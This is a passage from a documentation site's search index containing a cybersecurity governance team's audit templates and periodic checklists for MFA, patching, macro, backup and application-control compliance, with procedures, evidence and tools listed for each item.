Team/GRC-Team-Audits/Audit Templates/audit-template#general-audit-points","content":" ","version":"Next","tagName":"h2"},{"title":"Policy Compliance​","type":1,"pageTitle":"Audit Template","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/audit-template#policy-compliance","content":" Audit Area\tCompliant? Yes or No\tOvservations / Comments\tAction Required1.1 Are the correct encryption methods being used for data in storage and transmission? 1.2 Are the related DLP Policies Being Adhered to? 1.3 Are the related Data Classification Policies being adhered to? 1.4. Have forms of physical security for data protection been implemented? 1.5. Have forms of digital security for data protection been implemented? 1.6. Have EASM risks been identified? 1.7. Have appropriate EASM risk management strategies been implemented? 1.8. Have all employees undergone the appropriate User Awareness Training?   ","version":"Next","tagName":"h3"},{"title":"Ethical Considerations and Requirements​","type":1,"pageTitle":"Audit Template","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/audit-template#ethical-considerations-and-requirements","content":" Audit Area\tCompliant? Yes or No\tOvservations / Comments\tAction Required2.1. Are all forms of data collection briefed with customers, and consent is gathered? 2.2. Has all collected information and data been classified with data classification requirements? 2.3. Is data anonymity used to protect the privacy of customers? 2.4. Is the cryptography policy being adhered to? 2.5. Is data minimalization being put in place when collecting data? 2.6. Looping back to the ISMS policies, are they being adhered to when required?   ","version":"Next","tagName":"h3"},{"title":"Governance​","type":1,"pageTitle":"Audit Template","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/audit-template#governance","content":" Audit Area\tCompliant? Yes or No\tOvservations / Comments\tAction Required3.1. Is the team adhering to the company’s governance framework? 3.2. Are team roles and responsibilities clearly defined and documented? 3.3. Is there a risk management plan in place? 3.4. Is there an incident response plan in place? 3.5. Are incidents logged and reviewed for continuous improvement?   ","version":"Next","tagName":"h3"},{"title":"Project-Specific Audit Points​","type":1,"pageTitle":"Audit Template","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/audit-template#project-specific-audit-points","content":" Auditors need to develop their own range of audit points for their respective project of audit, these may only apply to the project that they are auditing. The structure for the General Audit Points section should be used.  ","version":"Next","tagName":"h2"},{"title":"Summary​","type":1,"pageTitle":"Audit Template","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/audit-template#summary","content":" After the audit has been completed, a report needs to be formed. The structure of this report can be sourced from existing reports, though the video link below includes a tutorial on how to conduct the audit and formulate an audit report.  Link: https://youtu.be/FvGHO3ixBo8 ","version":"Next","tagName":"h2"},{"title":"Bi-Annual Audit Checklist","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/bi-annual-audit-checklist","content":"","keywords":"","version":"Next"},{"title":"Multi-Factor Authentication​","type":1,"pageTitle":"Bi-Annual Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/bi-annual-audit-checklist#multi-factor-authentication","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-MF-06 — MFA is enabled by default for external (non-organisational) users accessing Redback services.​","type":1,"pageTitle":"Bi-Annual Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/bi-annual-audit-checklist#ml1-mf-06--mfa-is-enabled-by-default-for-external-non-organisational-users-accessing-redback-services","content":" Audit Procedure: Simulate an external login; verify default MFA behavior. Evidence Required: Login test results, configuration screen evidence. Tools/Methods: Azure B2B, GitHub Organization Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit. ","version":"Next","tagName":"h3"},{"title":"Daily Audit Checklist","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/daily-audit-checklist","content":"","keywords":"","version":"Next"},{"title":"Patch Applications​","type":1,"pageTitle":"Daily Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/daily-audit-checklist#patch-applications","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-PA-02 — Vulnerability scanner uses an up-to-date vulnerability database.​","type":1,"pageTitle":"Daily Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/daily-audit-checklist#ml1-pa-02--vulnerability-scanner-uses-an-up-to-date-vulnerability-database","content":" Audit Procedure: Check database version and last update timestamps in scanner console. Evidence Required: Scanner config files, version logs. Tools/Methods: Qualys, Nessus, Rapid7 Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-PA-03 — Vulnerability scans run daily on all internet-facing applications and services.​","type":1,"pageTitle":"Daily Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/daily-audit-checklist#ml1-pa-03--vulnerability-scans-run-daily-on-all-internet-facing-applications-and-services","content":" Audit Procedure: Validate daily scan logs and alerting mechanisms for exposed services. Evidence Required: Daily reports, alerting logs. Tools/Methods: Nessus, Tenable.io Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"Patch Operating Systems​","type":1,"pageTitle":"Daily Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/daily-audit-checklist#patch-operating-systems","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-PO-02 — Vulnerability scanner used has an up-to-date vulnerability database.​","type":1,"pageTitle":"Daily Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/daily-audit-checklist#ml1-po-02--vulnerability-scanner-used-has-an-up-to-date-vulnerability-database","content":" Audit Procedure: Check scanner config and verify update frequency. Evidence Required: Scanner version info, update logs. Tools/Methods: Nessus, OpenVAS, GVM Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-PO-03 — Daily scans are performed on operating systems of internet-facing services.​","type":1,"pageTitle":"Daily Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/daily-audit-checklist#ml1-po-03--daily-scans-are-performed-on-operating-systems-of-internet-facing-services","content":" Audit Procedure: Validate daily scan frequency; review issue triage and response logs. Evidence Required: Daily scan reports, incident tickets. Tools/Methods: Nessus Pro, InsightVM Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit. ","version":"Next","tagName":"h3"},{"title":"Fortnightly Audit Checklist","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/fortnightly-audit-checklist","content":"","keywords":"","version":"Next"},{"title":"Patch Applications​","type":1,"pageTitle":"Fortnightly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/fortnightly-audit-checklist#patch-applications","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-PA-01 — Automated asset discovery runs at least fortnightly to detect new systems and applications.​","type":1,"pageTitle":"Fortnightly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/fortnightly-audit-checklist#ml1-pa-01--automated-asset-discovery-runs-at-least-fortnightly-to-detect-new-systems-and-applications","content":" Audit Procedure: Review scan configuration and logs; validate schedule enforcement. Evidence Required: Scan logs, scheduler output, discovery delta reports. Tools/Methods: Qualys, Nessus, GVM Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-PA-04 — Fortnightly scans run for office software, email clients, and browsers.​","type":1,"pageTitle":"Fortnightly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/fortnightly-audit-checklist#ml1-pa-04--fortnightly-scans-run-for-office-software-email-clients-and-browsers","content":" Audit Procedure: Verify credentials, schedules, and scope of scan. Evidence Required: Fortnightly reports, credentialed scan logs. Tools/Methods: GVM, Nessus Pro Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"Patch Operating Systems​","type":1,"pageTitle":"Fortnightly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/fortnightly-audit-checklist#patch-operating-systems","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-PO-01 — An automated method of asset discovery is run and reviewed at least fortnightly.​","type":1,"pageTitle":"Fortnightly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/fortnightly-audit-checklist#ml1-po-01--an-automated-method-of-asset-discovery-is-run-and-reviewed-at-least-fortnightly","content":" Audit Procedure: Validate discovery tool schedule, logs, and exception handling. Evidence Required: Discovery logs, schedule screenshots, output files. Tools/Methods: Qualys, Nessus, CMDB Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-PO-04 — Fortnightly scans are conducted for workstations, servers, and network devices.​","type":1,"pageTitle":"Fortnightly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/fortnightly-audit-checklist#ml1-po-04--fortnightly-scans-are-conducted-for-workstations-servers-and-network-devices","content":" Audit Procedure: Check scan history and review report completeness across all environments. Evidence Required: Full vulnerability scan report logs. Tools/Methods: Qualys, GVM Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit. ","version":"Next","tagName":"h3"},{"title":"Monthly Audit Checklist","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist","content":"","keywords":"","version":"Next"},{"title":"Multi-Factor Authentication​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#multi-factor-authentication","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-MF-01 — MFA is enforced on all internet-facing Redback services (e.g., GitHub, GCP).​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#ml1-mf-01--mfa-is-enforced-on-all-internet-facing-redback-services-eg-github-gcp","content":" Audit Procedure: Attempt user authentication and verify MFA challenge on login. Evidence Required: Access attempt logs, screenshots of MFA prompts, enforcement settings. Tools/Methods: GitHub, GCP IAM, Azure Console Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-MF-02 — MFA challenge is triggered for remote desktop access to internal systems.​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#ml1-mf-02--mfa-challenge-is-triggered-for-remote-desktop-access-to-internal-systems","content":" Audit Procedure: Perform test RDP session and check for MFA prompt. Evidence Required: VPN/RDP access logs, security group enforcement evidence. Tools/Methods: Azure AD, Duo, RDP Config Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-MF-03 — All other internet-facing systems require MFA on login.​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#ml1-mf-03--all-other-internet-facing-systems-require-mfa-on-login","content":" Audit Procedure: Enumerate services; attempt user login; confirm MFA challenge. Evidence Required: MFA logs, system login records, user directory screenshots. Tools/Methods: Okta, PingID, Azure MFA Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-MF-07 — MFA bypass policies are reviewed monthly and exceptions require formal approval.​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#ml1-mf-07--mfa-bypass-policies-are-reviewed-monthly-and-exceptions-require-formal-approval","content":" Audit Procedure: Review all policy exceptions and approvals for validity. Evidence Required: Exception tracking sheets, approval forms. Tools/Methods: IAM Dashboard, Jira, Confluence Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"Office Macros​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#office-macros","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-OM-10 — Microsoft Office macro usage logs are retained for audit trail and incident investigation.​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#ml1-om-10--microsoft-office-macro-usage-logs-are-retained-for-audit-trail-and-incident-investigation","content":" Audit Procedure: Verify log retention settings; ensure logs are centralized. Evidence Required: Sysmon logs, GPO logging configuration, centralized log exports. Tools/Methods: SIEM, Event Viewer, Syslog Server Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"Patch Applications​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#patch-applications","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-PA-08 — Patches for internal apps (Office, PDF, browsers) applied within one month.​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#ml1-pa-08--patches-for-internal-apps-office-pdf-browsers-applied-within-one-month","content":" Audit Procedure: Review patch cycles and correlate version info with vendor dates. Evidence Required: Patch audit reports, software version matrix. Tools/Methods: E8MVT, Software Inventory Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-PA-09 — Internal applications contain no vulnerabilities older than one month.​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#ml1-pa-09--internal-applications-contain-no-vulnerabilities-older-than-one-month","content":" Audit Procedure: Use scanner to verify version compliance. Evidence Required: List of vulnerable versions, patch timestamps. Tools/Methods: Qualys, Nessus, E8MVT Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"Patch Operating Systems​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#patch-operating-systems","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-PO-08 — Workstation and server OS patches are applied within one month of release.​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#ml1-po-08--workstation-and-server-os-patches-are-applied-within-one-month-of-release","content":" Audit Procedure: Match scan output with patch application dates; check backlog or exceptions. Evidence Required: Patch cycle report, dashboard exports. Tools/Methods: WSUS, Linux YUM/APT Logs Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-PO-09 — No OS vulnerabilities older than one month exist in any production environment.​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#ml1-po-09--no-os-vulnerabilities-older-than-one-month-exist-in-any-production-environment","content":" Audit Procedure: Run full authenticated vulnerability scan and compare to patch registry. Evidence Required: Vulnerability scan logs, remediation reports. Tools/Methods: Qualys, Nessus Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"Regular Backups​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#regular-backups","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-RB-09 — Backup systems are regularly patched and updated to prevent exploitation of backup infrastructure.​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#ml1-rb-09--backup-systems-are-regularly-patched-and-updated-to-prevent-exploitation-of-backup-infrastructure","content":" Audit Procedure: Check patch levels, CVEs, and update history of backup systems. Evidence Required: Patch management reports, CVE summaries. Tools/Methods: Nessus, GVM, Patch Logs Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-RB-10 — Backup logs and access events are centrally stored and retained for investigation and forensics.​","type":1,"pageTitle":"Monthly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/monthly-audit-checklist#ml1-rb-10--backup-logs-and-access-events-are-centrally-stored-and-retained-for-investigation-and-forensics","content":" Audit Procedure: Verify central logging for backup infrastructure and access. Evidence Required: SIEM logs, syslog records, retention policy evidence. Tools/Methods: Splunk, CloudWatch Logs, Graylog Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit. ","version":"Next","tagName":"h3"},{"title":"Weekly Audit Checklist","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/weekly-audit-checklist","content":"","keywords":"","version":"Next"},{"title":"Multi-Factor Authentication​","type":1,"pageTitle":"Weekly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/weekly-audit-checklist#multi-factor-authentication","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-MF-08 — MFA logs are collected and reviewed for suspicious login attempts.​","type":1,"pageTitle":"Weekly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/weekly-audit-checklist#ml1-mf-08--mfa-logs-are-collected-and-reviewed-for-suspicious-login-attempts","content":" Audit Procedure: Inspect SIEM logs and MFA monitoring dashboards. Evidence Required: SIEM alerts, login pattern reports. Tools/Methods: Splunk, Microsoft Sentinel Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"Patch Applications​","type":1,"pageTitle":"Weekly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/weekly-audit-checklist#patch-applications","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-PA-06 — Confirm all known exploitable vulnerabilities older than 48 hours are patched or mitigated.​","type":1,"pageTitle":"Weekly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/weekly-audit-checklist#ml1-pa-06--confirm-all-known-exploitable-vulnerabilities-older-than-48-hours-are-patched-or-mitigated","content":" Audit Procedure: Run patch verification and determine lag beyond allowed window. Evidence Required: Remediation evidence, exception logs. Tools/Methods: Qualys, Sysmon Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-PA-07 — All internet-facing apps patched within 2 weeks of patch availability.​","type":1,"pageTitle":"Weekly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/weekly-audit-checklist#ml1-pa-07--all-internet-facing-apps-patched-within-2-weeks-of-patch-availability","content":" Audit Procedure: Compare software patch date with original vendor release. Evidence Required: System patch logs, vendor release notes. Tools/Methods: Patch management dashboard Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"Regular Backups​","type":1,"pageTitle":"Weekly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/weekly-audit-checklist#regular-backups","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-RB-02 — Important data and configuration settings are backed up weekly.​","type":1,"pageTitle":"Weekly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/weekly-audit-checklist#ml1-rb-02--important-data-and-configuration-settings-are-backed-up-weekly","content":" Audit Procedure: Inspect backup logs and compare to policy schedule. Evidence Required: Backup job reports, retention policy, storage logs. Tools/Methods: Veeam, GCP Snapshot, AWS Backup Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-RB-03 — Backups are performed in a synchronised manner across systems and environments.​","type":1,"pageTitle":"Weekly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/weekly-audit-checklist#ml1-rb-03--backups-are-performed-in-a-synchronised-manner-across-systems-and-environments","content":" Audit Procedure: Confirm snapshot coordination across systems. Evidence Required: Timestamps of snapshots, recovery point reports. Tools/Methods: ZFS, RAID Logs, Cloud Sync Reports Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit. ","version":"Next","tagName":"h3"},{"title":"Quarterly Audit Checklist","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist","content":"","keywords":"","version":"Next"},{"title":"Application Control​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#application-control","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-AC-01 — Prevent execution of EXE/COM files in user profile directories by standard users.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ac-01--prevent-execution-of-execom-files-in-user-profile-directories-by-standard-users","content":" Audit Procedure: Attempt to run benign EXE/COM file in temp directories or Desktop. Evidence Required: Execution logs, screenshots of failed attempts. Tools/Methods: E8MVT, Manual Execution Test Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-AC-02 — Block software library files (DLL/OCX) from executing in user profile/temp folders.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ac-02--block-software-library-files-dllocx-from-executing-in-user-profiletemp-folders","content":" Audit Procedure: Place DLL/OCX files in user space and attempt to invoke using standard tools. Evidence Required: System logs, execution attempts, allowlist enforcement logs. Tools/Methods: E8MVT Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-AC-03 — Prevent script file (BAT, PS, VBS, JS) execution in restricted paths.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ac-03--prevent-script-file-bat-ps-vbs-js-execution-in-restricted-paths","content":" Audit Procedure: Deploy test scripts into temp folders and execute with user permissions. Evidence Required: Screenshots of blocked script runs, log entries showing prevention. Tools/Methods: ACVT, PowerShell Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-AC-04 — Prevent installation via MSI/MST/MSP in non-privileged locations.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ac-04--prevent-installation-via-msimstmsp-in-non-privileged-locations","content":" Audit Procedure: Attempt to install dummy MSI via user Desktop or Downloads. Evidence Required: E8MVT reports, MSI install logs, endpoint monitoring logs. Tools/Methods: E8MVT Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-AC-05 — Block execution of Compiled HTML (CHM) files from temp/user locations.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ac-05--block-execution-of-compiled-html-chm-files-from-tempuser-locations","content":" Audit Procedure: Run benign CHM files from various folders and log behavior. Evidence Required: Screenshot and CHM handling logs. Tools/Methods: Manual Test, E8MVT Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-AC-06 — Block execution of HTML applications (HTA) from browser cache or download folders.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ac-06--block-execution-of-html-applications-hta-from-browser-cache-or-download-folders","content":" Audit Procedure: Attempt to run HTA file from Downloads directory. Evidence Required: Browser logs, application policy evidence, HTA test file logs. Tools/Methods: E8MVT, Manual Browser Test Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-AC-07 — Block Control Panel Applet (CPL) execution from non-system folders.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ac-07--block-control-panel-applet-cpl-execution-from-non-system-folders","content":" Audit Procedure: Run benign CPL from Downloads and verify execution is blocked. Evidence Required: ACVT reports, Windows logs, allowlist policies. Tools/Methods: ACVT Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-AC-08 — Application allowlisting enforced via policy and managed centrally.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ac-08--application-allowlisting-enforced-via-policy-and-managed-centrally","content":" Audit Procedure: Review allowlist management system and policy distribution (e.g., Intune, GPO). Evidence Required: Allowlist configuration files, policy logs. Tools/Methods: Group Policy, Config Audit Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-AC-09 — Execution prevention enforced even when file renamed or copied across locations.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ac-09--execution-prevention-enforced-even-when-file-renamed-or-copied-across-locations","content":" Audit Procedure: Rename known executables (e.g., .txt to .exe) and attempt execution. Evidence Required: Test logs, screenshots, renamed file handling logs. Tools/Methods: Manual Tests, E8MVT Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-AC-10 — File execution control verified against known bypass vectors.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ac-10--file-execution-control-verified-against-known-bypass-vectors","content":" Audit Procedure: Attempt to exploit known paths (e.g., 8.3 name format, symbolic links). Evidence Required: Output of exploit test cases, logs from bypass attempts. Tools/Methods: E8MVT, ACVT, Script Toolkit Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"Office Macros​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#office-macros","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-OM-01 — Microsoft Office macros are disabled for all users by default.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-om-01--microsoft-office-macros-are-disabled-for-all-users-by-default","content":" Audit Procedure: Run RSOP or review Group Policy settings; test macro behavior. Evidence Required: GPO config screenshots, test results, approved user list. Tools/Methods: RSOP, GPMC, Office Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-OM-02 — A record is maintained of users approved to run macros.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit 